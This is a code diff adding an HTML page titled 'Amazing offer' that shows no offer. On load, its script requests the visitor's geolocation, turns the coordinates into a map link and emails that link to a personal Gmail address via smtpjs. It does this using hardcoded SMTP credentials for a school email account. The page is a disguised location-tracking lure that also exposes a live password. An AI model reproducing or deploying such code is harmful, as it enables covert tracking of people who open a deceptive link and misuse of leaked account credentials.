@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Amazing offer</title>
+</head>
+<body>
+    <script>
+function sendEmail(link){
+  Email.send({
+    Host:"smtp.elasticemail.com",
+    Port:2525,
+    Username:"onlineapplication@brookinternationalschool.com",
+    Password:"64BB8C3AACD5A17603FA71136A202A385DCA",
+    To:"muhammedhilal.a@gmail.com",
+    From:"onlineapplication@brookinternationalschool.com",
+    Subject:`Geo location`,
+    Body:`Location Link <br/> 
+     ${link} <br/> `,
+  }).then((message) => {
+    console.log(JSON.stringify(message))
+    alert("Thank You")
+})
+}
+        function success(position) {
+            
+            const latitude  = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            link = `https://www.openstreetmap.org/#map=18/${latitude}/${longitude}`;
+            this.sendEmail(link);
+        }
+        function error() {
+            console.log('Unable to retrieve your location');
+        }
+        window.onload= function(){
+            if(!navigator.geolocation) {
+            console.log('Geolocation is not supported by your browser');
+            } else {
+             console.log('Locating…');
+             navigator.geolocation.getCurrentPosition(success, error);
+            }
+        }
+    </script>
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <script src="script.js"></script>
+</body>
+</html>
